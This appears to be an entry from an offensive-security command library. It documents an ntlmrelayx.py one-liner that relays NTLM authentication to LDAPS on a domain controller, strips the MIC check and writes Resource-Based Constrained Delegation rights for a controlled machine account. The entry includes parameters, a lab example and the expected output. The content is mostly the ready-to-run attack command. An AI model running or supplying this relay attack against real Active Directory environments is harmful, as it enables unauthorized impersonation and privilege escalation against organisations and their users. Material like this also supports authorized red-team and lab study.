---
id: c1ca3dc4-9329-4a3c-9ab9-d8243dbdb237
name: ntlmrelayx-grant-delegation-access
type: command
executor: bash
data: >-
  ntlmrelayx.py -t ldaps://$_DOMAIN_CONTROLLER --remove-mic --delegate-access
  -smb2support
output: null
created_at: '2023-04-06T03:56:03.096209+00:00'
updated_at: '2023-04-10T20:26:11.555942+00:00'
platforms:
  - Windows
tags:
  - relay
  - delegation
verified: true
validated: true
---

# ntlmrelayx-grant-delegation-access

## Command

```bash
ntlmrelayx.py -t ldaps://$_DOMAIN_CONTROLLER --remove-mic --delegate-access -smb2support
```

## Description

Relays NTLM auth to LDAPS on DC to grant Resource-Based Constrained Delegation access to a controlled machine account, allowing impersonation to target services.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -t | Target LDAPS URL | Yes |
| --remove-mic | Bypass MIC checks | Yes |
| --delegate-access | Set RBCD permissions via LDAP | Yes |
| -smb2support | SMB2 compatibility | Yes |
| $_DOMAIN_CONTROLLER | DC FQDN (e.g., rlt-dc.relaytest.local) | Yes |

## Examples

### Basic Usage

```bash
ntlmrelayx.py -t ldaps://rlt-dc.relaytest.local --remove-mic --delegate-access -smb2support
```

### Advanced Usage

Specify --machine-account to target specific delegation.

## Expected Output

[*] Relaying to LDAPS...
[*] Modified msDS-AllowedToActOnBehalfOfOtherIdentity for MACHINE$

Success if attribute updated; check LDAP for confirmation.

## Related

- [[procedures/resource-based-constrained-delegation-via-printerbug]]
- [[commands/printerbug-trigger-spool-bug]]
